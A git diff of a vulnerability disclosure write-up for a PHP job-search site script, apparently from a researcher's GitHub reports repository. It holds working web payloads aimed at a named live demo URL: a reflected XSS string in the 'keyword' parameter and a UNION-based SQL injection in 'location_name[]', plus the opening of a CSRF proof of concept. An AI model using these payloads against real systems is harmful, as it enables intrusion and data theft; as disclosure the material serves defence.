@@ -12,9 +12,11 @@ There're some reflect-xss in this system, for example:
 http://phpscriptsmall.biz/demo/onlinejobsearch/job
 ```
 
-POST para:
+POST key para "keyword":
 
+```
 keyword='"><svg/onload=alert(/xss/)><'"&location_name[]=
+```
 
 ![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/ready-made-job-site-script/xss2.png)
 
@@ -27,7 +29,7 @@ There're some reflect-xss in this system, for example:
 http://phpscriptsmall.biz/demo/onlinejobsearch/job
 ```
 
-POST para:
+POST key para "location_name[]":
 
 ```
 keyword=666&location_name[]=-1813) UNION ALL SELECT 6208,6208,6208,6208,6208,6208,6208,6208,6208,6208,6208,6208,CONCAT(0x716a707071,0x4b7052435851504b686a5571556e74777a5a43616a5742614b4e466b7a424a6f4b6b59484a566a51,0x716b6b6b71),6208,6208,6208,6208,6208,6208,6208,6208,6208,6208,6208,6208#
@@ -41,6 +43,8 @@ You can see,  we can obtain the current data user or more sensitive data now!
 #### CSRF
 
 With the csrf bug, we can cheat the user to change some important content ,or get post reflect-xss attack here.
+
+POC：
 
 ```
 <html>
